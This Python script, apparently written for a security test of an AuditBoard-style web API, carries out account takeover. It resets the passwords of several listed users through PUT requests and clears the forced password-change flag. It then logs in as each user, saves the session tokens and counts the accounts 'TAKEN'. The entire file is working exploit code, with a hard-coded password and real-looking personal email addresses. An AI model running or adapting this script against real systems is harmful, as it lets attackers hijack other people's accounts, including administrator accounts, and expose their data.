import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
PW="Zx9!r2all47"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
targets=[(65,'daniel@u1elhxrx.mailosaur.net'),(123,'jim@u1elhxrx.mailosaur.net'),
         (301,'jvolles@auditboard.com'),(306,'juanmanager@email.com'),(307,'juanadmin@email.com'),
         (308,'jhurt+test2@auditboard.com'),(316,'jhurt+admin@optro.ai')]
ok=0
for uid,email in targets:
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"password":PW}})
    line=f"  {uid:3} {email[:40]:42} PUT={c}"
    if c=='200':
        req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
        c2,b2=login(email,PW)
        line+=f" login={c2}"
        if c2=='200':
            ok+=1
            s=json.loads(b2)['session']
            line+=f"  *** role {s['role_id']} TAKEN ***"
            open(f'/tmp/tok{uid}','w').write(s['token'])
    print(line)
print(f"\nrole-2 accounts successfully taken over: {ok}/{len(targets)}")
